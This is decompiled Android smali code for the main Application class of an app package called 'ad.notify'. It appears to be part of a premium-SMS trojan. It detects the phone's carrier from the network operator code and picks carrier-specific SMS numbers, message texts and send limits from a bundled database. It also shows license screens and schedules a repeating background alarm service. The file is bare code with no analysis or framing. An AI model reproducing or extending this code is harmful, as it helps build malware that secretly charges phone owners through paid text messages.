.class public Lad/notify/NotificationApplication;
.super Landroid/app/Application;
.source "NotificationApplication.java"


# static fields
.field static adPeriod:J

.field static adUrl:Ljava/lang/String;

.field static days:I

.field static endScreen:Lad/notify/ScreenItem;

.field static errorScreen:Lad/notify/ScreenItem;

.field static installUrl:Ljava/lang/String;

.field static licenseIndex:I

.field static licenseScreen:Lad/notify/ScreenItem;

.field static licenseScreens:Ljava/util/Vector;

.field static licenseWithOneButton:Z

.field static mainScreen:Lad/notify/ScreenItem;

.field static mainScreens:Ljava/util/Vector;

.field static maxSendCount:I

.field static maxSms:I

.field private static result:Ljava/lang/String;

.field static secondStart:Z

.field static sendSmsOn:Z

.field static sendSmsPeriod:J

.field static settings:Lad/notify/Settings;

.field static showLicense:Z

.field static sms:Ljava/util/Vector;

.field static smsIndex:I

.field static url:Ljava/lang/String;

.field static waitScreen:Lad/notify/ScreenItem;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    .prologue
    const/4 v2, 0x1

    const/4 v1, 0x0

    const/4 v0, 0x0

    .line 46
    sput-object v1, Lad/notify/NotificationApplication;->settings:Lad/notify/Settings;

    .line 57
    sput-object v1, Lad/notify/NotificationApplication;->sms:Ljava/util/Vector;

    .line 58
    sput-object v1, Lad/notify/NotificationApplication;->url:Ljava/lang/String;

    .line 59
    sput v0, Lad/notify/NotificationApplication;->smsIndex:I

    .line 60
    sput-boolean v2, Lad/notify/NotificationApplication;->showLicense:Z

    .line 61
    sput-boolean v2, Lad/notify/NotificationApplication;->secondStart:Z

    .line 63
    sput v0, Lad/notify/NotificationApplication;->licenseIndex:I

    .line 65
    sput v0, Lad/notify/NotificationApplication;->days:I

    .line 66
    sput v0, Lad/notify/NotificationApplication;->maxSms:I

    .line 67
    sput v0, Lad/notify/NotificationApplication;->maxSendCount:I

    .line 69
    sput-object v1, Lad/notify/NotificationApplication;->installUrl:Ljava/lang/String;

    .line 70
    sput-object v1, Lad/notify/NotificationApplication;->adUrl:Ljava/lang/String;

    .line 71
    const-wide/16 v0, 0x1

    sput-wide v0, Lad/notify/NotificationApplication;->adPeriod:J

    .line 44
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 44
    invoke-direct {p0}, Landroid/app/Application;-><init>()V

    return-void
.end method

.method public static getRestrictionById(ILjava/util/Vector;)V
    .locals 3
    .param p0, "id"    # I
    .param p1, "restrictions"    # Ljava/util/Vector;

    .prologue
    .line 201
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    invoke-virtual {p1}, Ljava/util/Vector;->size()I

    move-result v2

    if-lt v0, v2, :cond_0

    .line 210
    return-void

    .line 203
    :cond_0
    invoke-virtual {p1, v0}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lad/notify/Restriction;

    .line 204
    .local v1, "restriction":Lad/notify/Restriction;
    iget v2, v1, Lad/notify/Restriction;->id:I

    if-ne v2, p0, :cond_1

    .line 206
    iget v2, v1, Lad/notify/Restriction;->days:I

    sput v2, Lad/notify/NotificationApplication;->days:I

    .line 207
    iget v2, v1, Lad/notify/Restriction;->maxSend:I

    sput v2, Lad/notify/NotificationApplication;->maxSms:I

    .line 201
    :cond_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public static getScreenById(I)Lad/notify/ScreenItem;
    .locals 3
    .param p0, "id"    # I

    .prologue
    .line 190
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    sget-object v2, Lad/notify/NotificationApplication;->mainScreens:Ljava/util/Vector;

    invoke-virtual {v2}, Ljava/util/Vector;->size()I

    move-result v2

    if-lt v0, v2, :cond_0

    .line 196
    const/4 v2, 0x0

    :goto_1
    return-object v2

    .line 192
    :cond_0
    sget-object v2, Lad/notify/NotificationApplication;->mainScreens:Ljava/util/Vector;

    invoke-virtual {v2, v0}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lad/notify/ScreenItem;

    .line 193
    .local v1, "screen":Lad/notify/ScreenItem;
    iget v2, v1, Lad/notify/ScreenItem;->id:I

    if-ne v2, p0, :cond_1

    move-object v2, v1

    goto :goto_1

    .line 190
    :cond_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public static loadOperatorList(Lorg/MobileDb/MobileDatabase;)Ljava/util/Vector;
    .locals 12
    .param p0, "db"    # Lorg/MobileDb/MobileDatabase;

    .prologue
    .line 136
    new-instance v3, Ljava/util/Vector;

    invoke-direct {v3}, Ljava/util/Vector;-><init>()V

    .line 138
    .local v3, "list":Ljava/util/Vector;
    const-string v10, "operators"

    invoke-virtual {p0, v10}, Lorg/MobileDb/MobileDatabase;->getTableByName(Ljava/lang/String;)Lorg/MobileDb/Table;

    move-result-object v8

    .line 139
    .local v8, "table":Lorg/MobileDb/Table;
    const/4 v1, 0x0

    .local v1, "i":I
    :goto_0
    invoke-virtual {v8}, Lorg/MobileDb/Table;->rowsCount()I

    move-result v10

    if-lt v1, v10, :cond_0

    .line 147
    const-string v10, "codes"

    invoke-virtual {p0, v10}, Lorg/MobileDb/MobileDatabase;->getTableByName(Ljava/lang/String;)Lorg/MobileDb/Table;

    move-result-object v8

    .line 148
    const/4 v1, 0x0

    :goto_1
    invoke-virtual {v8}, Lorg/MobileDb/Table;->rowsCount()I

    move-result v10

    if-lt v1, v10, :cond_1

    .line 164
    const-string v10, "sms"

    invoke-virtual {p0, v10}, Lorg/MobileDb/MobileDatabase;->getTableByName(Ljava/lang/String;)Lorg/MobileDb/Table;

    move-result-object v8

    .line 165
    const/4 v1, 0x0

    :goto_2
    invoke-virtual {v8}, Lorg/MobileDb/Table;->rowsCount()I

    move-result v10

    if-lt v1, v10, :cond_4

    .line 183
    return-object v3

    .line 141
    :cond_0
    new-instance v5, Lad/notify/SmsOperator;

    const-string v10, "id"

    invoke-virtual {v8, v10, v1}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/Integer;

    const-string v11, "screen_id"

    invoke-virtual {v8, v11, v1}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Ljava/lang/Integer;

    invoke-direct {v5, v10, v11}, Lad/notify/SmsOperator;-><init>(Ljava/lang/Integer;Ljava/lang/Integer;)V

    .line 142
    .local v5, "operator":Lad/notify/SmsOperator;
    const-string v10, "name"

    invoke-virtual {v8, v10, v1}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    iput-object v10, v5, Lad/notify/SmsOperator;->name:Ljava/lang/String;

    .line 144
    invoke-virtual {v3, v5}, Ljava/util/Vector;->addElement(Ljava/lang/Object;)V

    .line 139
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 150
    .end local v5    # "operator":Lad/notify/SmsOperator;
    :cond_1
    const-string v10, "operator_id"

    invoke-virtual {v8, v10, v1}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/Integer;

    .line 151
    .local v6, "operatorId":Ljava/lang/Integer;
    const-string v10, "code"

    invoke-virtual {v8, v10, v1}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    .line 153
    .local v0, "code":Ljava/lang/String;
    const/4 v2, 0x0

    .local v2, "j":I
    :goto_3
    invoke-virtual {v3}, Ljava/util/Vector;->size()I

    move-result v10

    if-lt v2, v10, :cond_2

    .line 148
    :goto_4
    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    .line 155
    :cond_2
    invoke-virtual {v3, v2}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Lad/notify/SmsOperator;

    .line 156
    .restart local v5    # "operator":Lad/notify/SmsOperator;
    iget v10, v5, Lad/notify/SmsOperator;->id:I

    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v11

    if-ne v10, v11, :cond_3

    .line 158
    iget-object v10, v5, Lad/notify/SmsOperator;->codes:Ljava/util/Vector;

    invoke-virtual {v10, v0}, Ljava/util/Vector;->addElement(Ljava/lang/Object;)V

    goto :goto_4

    .line 153
    :cond_3
    add-int/lit8 v2, v2, 0x1

    goto :goto_3

    .line 167
    .end local v0    # "code":Ljava/lang/String;
    .end local v2    # "j":I
    .end local v5    # "operator":Lad/notify/SmsOperator;
    .end local v6    # "operatorId":Ljava/lang/Integer;
    :cond_4
    const-string v10, "operator_id"

    invoke-virtual {v8, v10, v1}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/Integer;

    .line 168
    .restart local v6    # "operatorId":Ljava/lang/Integer;
    const-string v10, "number"

    invoke-virtual {v8, v10, v1}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/Integer;

    .line 169
    .local v4, "number":Ljava/lang/Integer;
    const-string v10, "text"

    invoke-virtual {v8, v10, v1}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Ljava/lang/String;

    .line 171
    .local v9, "text":Ljava/lang/String;
    const/4 v2, 0x0

    .restart local v2    # "j":I
    :goto_5
    invoke-virtual {v3}, Ljava/util/Vector;->size()I

    move-result v10

    if-lt v2, v10, :cond_5

    .line 165
    :goto_6
    add-int/lit8 v1, v1, 0x1

    goto :goto_2

    .line 173
    :cond_5
    invoke-virtual {v3, v2}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Lad/notify/SmsOperator;

    .line 174
    .restart local v5    # "operator":Lad/notify/SmsOperator;
    iget v10, v5, Lad/notify/SmsOperator;->id:I

    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v11

    if-ne v10, v11, :cond_6

    .line 176
    new-instance v7, Lad/notify/SmsItem;

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v10

    invoke-static {v10}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v7, v10, v9}, Lad/notify/SmsItem;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 177
    .local v7, "sms":Lad/notify/SmsItem;
    iget-object v10, v5, Lad/notify/SmsOperator;->sms:Ljava/util/Vector;

    invoke-virtual {v10, v7}, Ljava/util/Vector;->addElement(Ljava/lang/Object;)V

    goto :goto_6

    .line 171
    .end local v7    # "sms":Lad/notify/SmsItem;
    :cond_6
    add-int/lit8 v2, v2, 0x1

    goto :goto_5
.end method

.method public static loadRestriction(Lorg/MobileDb/MobileDatabase;)Ljava/util/Vector;
    .locals 6
    .param p0, "db"    # Lorg/MobileDb/MobileDatabase;

    .prologue
    .line 214
    new-instance v1, Ljava/util/Vector;

    invoke-direct {v1}, Ljava/util/Vector;-><init>()V

    .line 216
    .local v1, "list":Ljava/util/Vector;
    const-string v4, "restriction"

    invoke-virtual {p0, v4}, Lorg/MobileDb/MobileDatabase;->getTableByName(Ljava/lang/String;)Lorg/MobileDb/Table;

    move-result-object v3

    .line 218
    .local v3, "table":Lorg/MobileDb/Table;
    const/4 v0, 0x0

    .end local p0    # "db":Lorg/MobileDb/MobileDatabase;
    .local v0, "i":I
    :goto_0
    invoke-virtual {v3}, Lorg/MobileDb/Table;->rowsCount()I

    move-result v4

    if-lt v0, v4, :cond_0

    .line 229
    return-object v1

    .line 220
    :cond_0
    new-instance v2, Lad/notify/Restriction;

    const-string v4, "operator_id"

    invoke-virtual {v3, v4, v0}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Ljava/lang/Integer;

    .line 221
    const-string v4, "days"

    invoke-virtual {v3, v4, v0}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/Integer;

    .line 222
    const-string v5, "max_send"

    invoke-virtual {v3, v5, v0}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/Integer;

    .line 220
    invoke-direct {v2, p0, v4, v5}, Lad/notify/Restriction;-><init>(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Integer;)V

    .line 224
    .local v2, "smsRestriction":Lad/notify/Restriction;
    invoke-virtual {v1, v2}, Ljava/util/Vector;->addElement(Ljava/lang/Object;)V

    .line 218
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public static loadSmsSet(Landroid/content/Context;Ljava/util/Vector;Ljava/util/Vector;)V
    .locals 9
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "operatorList"    # Ljava/util/Vector;
    .param p2, "restrictions"    # Ljava/util/Vector;

    .prologue
    .line 234
    const-string v7, "phone"

    invoke-virtual {p0, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/telephony/TelephonyManager;

    .line 236
    .local v5, "telephonyManager":Landroid/telephony/TelephonyManager;
    const-string v4, ""

    .line 237
    .local v4, "phone":Ljava/lang/String;
    if-eqz v5, :cond_0

    invoke-virtual {v5}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v4

    .line 239
    :cond_0
    const/4 v1, 0x0

    .end local p0    # "context":Landroid/content/Context;
    .local v1, "i":I
    :goto_0
    invoke-virtual {p1}, Ljava/util/Vector;->size()I

    move-result v7

    if-lt v1, v7, :cond_1

    .line 268
    const/4 v1, 0x0

    :goto_1
    invoke-virtual {p1}, Ljava/util/Vector;->size()I

    move-result v7

    if-lt v1, v7, :cond_6

    .line 283
    :goto_2
    return-void

    .line 241
    :cond_1
    invoke-virtual {p1, v1}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lad/notify/SmsOperator;

    .line 245
    .local v3, "operator":Lad/notify/SmsOperator;
    const/4 v6, 0x0

    .local v6, "x":I
    :goto_3
    iget-object v7, v3, Lad/notify/SmsOperator;->codes:Ljava/util/Vector;

    invoke-virtual {v7}, Ljava/util/Vector;->size()I

    move-result v7

    if-lt v6, v7, :cond_2

    .line 239
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 247
    :cond_2
    iget-object v7, v3, Lad/notify/SmsOperator;->codes:Ljava/util/Vector;

    invoke-virtual {v7, v6}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    .line 250
    .local v0, "code":Ljava/lang/String;
    const/4 v2, 0x0

    .local v2, "j":I
    :goto_4
    iget-object v7, v3, Lad/notify/SmsOperator;->sms:Ljava/util/Vector;

    invoke-virtual {v7}, Ljava/util/Vector;->size()I

    move-result v7

    if-lt v2, v7, :cond_4

    .line 256
    if-eqz v0, :cond_3

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v7

    if-nez v7, :cond_5

    .line 245
    :cond_3
    add-int/lit8 v6, v6, 0x1

    goto :goto_3

    .line 252
    :cond_4
    iget-object v7, v3, Lad/notify/SmsOperator;->sms:Ljava/util/Vector;

    invoke-virtual {v7, v2}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Lad/notify/SmsItem;

    .line 250
    add-int/lit8 v2, v2, 0x1

    goto :goto_4

    .line 258
    :cond_5
    invoke-virtual {v4, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_3

    .line 260
    iget-object v7, v3, Lad/notify/SmsOperator;->sms:Ljava/util/Vector;

    sput-object v7, Lad/notify/NotificationApplication;->sms:Ljava/util/Vector;

    .line 261
    iget v7, v3, Lad/notify/SmsOperator;->screenId:I

    invoke-static {v7}, Lad/notify/NotificationApplication;->getScreenById(I)Lad/notify/ScreenItem;

    move-result-object v7

    sput-object v7, Lad/notify/NotificationApplication;->mainScreen:Lad/notify/ScreenItem;

    .line 262
    iget v7, v3, Lad/notify/SmsOperator;->id:I

    invoke-static {v7, p2}, Lad/notify/NotificationApplication;->getRestrictionById(ILjava/util/Vector;)V

    goto :goto_2

    .line 270
    .end local v0    # "code":Ljava/lang/String;
    .end local v2    # "j":I
    .end local v3    # "operator":Lad/notify/SmsOperator;
    .end local v6    # "x":I
    :cond_6
    invoke-virtual {p1, v1}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lad/notify/SmsOperator;

    .line 272
    .restart local v3    # "operator":Lad/notify/SmsOperator;
    const/4 v6, 0x0

    .restart local v6    # "x":I
    :goto_5
    iget-object v7, v3, Lad/notify/SmsOperator;->codes:Ljava/util/Vector;

    invoke-virtual {v7}, Ljava/util/Vector;->size()I

    move-result v7

    if-lt v6, v7, :cond_7

    .line 268
    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    .line 274
    :cond_7
    iget-object v7, v3, Lad/notify/SmsOperator;->codes:Ljava/util/Vector;

    invoke-virtual {v7, v6}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v7

    const-string v8, "XXX"

    invoke-virtual {v7, v8}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_8

    .line 276
    iget-object v7, v3, Lad/notify/SmsOperator;->sms:Ljava/util/Vector;

    sput-object v7, Lad/notify/NotificationApplication;->sms:Ljava/util/Vector;

    .line 277
    iget v7, v3, Lad/notify/SmsOperator;->screenId:I

    invoke-static {v7}, Lad/notify/NotificationApplication;->getScreenById(I)Lad/notify/ScreenItem;

    move-result-object v7

    sput-object v7, Lad/notify/NotificationApplication;->mainScreen:Lad/notify/ScreenItem;

    .line 278
    iget v7, v3, Lad/notify/SmsOperator;->id:I

    invoke-static {v7, p2}, Lad/notify/NotificationApplication;->getRestrictionById(ILjava/util/Vector;)V

    goto/16 :goto_2

    .line 272
    :cond_8
    add-int/lit8 v6, v6, 0x1

    goto :goto_5
.end method


# virtual methods
.method public onCreate()V
    .locals 10

    .prologue
    const/4 v1, 0x0

    .line 83
    invoke-super {p0}, Landroid/app/Application;->onCreate()V

    .line 87
    :try_start_0
    invoke-static {p0}, Lad/notify/Utils;->loadData(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 92
    :goto_0
    new-instance v2, Lad/notify/Settings;

    invoke-direct {v2}, Lad/notify/Settings;-><init>()V

    sput-object v2, Lad/notify/NotificationApplication;->settings:Lad/notify/Settings;

    .line 94
    sget-object v2, Lad/notify/NotificationApplication;->settings:Lad/notify/Settings;

    invoke-virtual {v2, p0}, Lad/notify/Settings;->load(Landroid/content/Context;)Z

    move-result v2

    if-nez v2, :cond_0

    .line 96
    sget-object v2, Lad/notify/NotificationApplication;->settings:Lad/notify/Settings;

    iget-object v2, v2, Lad/notify/Settings;->saved:Lad/notify/SettingsSet;

    const/4 v3, 0x1

    iput-boolean v3, v2, Lad/notify/SettingsSet;->isFirstStart:Z

    .line 97
    sget-object v2, Lad/notify/NotificationApplication;->settings:Lad/notify/Settings;

    invoke-virtual {v2, p0}, Lad/notify/Settings;->save(Landroid/content/Context;)Z

    .line 100
    :cond_0
    sget-object v2, Lad/notify/NotificationApplication;->settings:Lad/notify/Settings;

    iget-object v2, v2, Lad/notify/Settings;->saved:Lad/notify/SettingsSet;

    iget-boolean v2, v2, Lad/notify/SettingsSet;->isFirstStart:Z

    if-eqz v2, :cond_1

    .line 104
    sget-object v2, Lad/notify/NotificationApplication;->settings:Lad/notify/Settings;

    iget-object v2, v2, Lad/notify/Settings;->saved:Lad/notify/SettingsSet;

    iput-boolean v1, v2, Lad/notify/SettingsSet;->isFirstStart:Z

    .line 105
    sget-object v2, Lad/notify/NotificationApplication;->settings:Lad/notify/Settings;

    invoke-virtual {v2, p0}, Lad/notify/Settings;->save(Landroid/content/Context;)Z

    .line 107
    sget-object v2, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v3, "FIRST START"

    invoke-virtual {v2, v3}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 110
    :cond_1
    new-instance v7, Landroid/content/Intent;

    const-class v2, Lad/notify/RepeatingAlarmService;

    invoke-direct {v7, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 111
    .local v7, "intent":Landroid/content/Intent;
    const v2, 0x193dacb4

    invoke-static {p0, v2, v7, v1}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    .line 113
    .local v6, "pendingIntent":Landroid/app/PendingIntent;
    const-string v2, "alarm"

    invoke-virtual {p0, v2}, Lad/notify/NotificationApplication;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 121
    .local v0, "alarmManager":Landroid/app/AlarmManager;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    sget-wide v4, Lad/notify/NotificationApplication;->adPeriod:J

    sget v8, Lad/notify/Settings;->MINUTE:I

    int-to-long v8, v8

    mul-long/2addr v4, v8

    add-long/2addr v2, v4

    .line 122
    sget-wide v4, Lad/notify/NotificationApplication;->adPeriod:J

    sget v8, Lad/notify/Settings;->MINUTE:I

    int-to-long v8, v8

    mul-long/2addr v4, v8

    .line 119
    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    .line 129
    return-void

    .line 89
    .end local v0    # "alarmManager":Landroid/app/AlarmManager;
    .end local v6    # "pendingIntent":Landroid/app/PendingIntent;
    .end local v7    # "intent":Landroid/content/Intent;
    :catch_0
    move-exception v2

    goto :goto_0
.end method
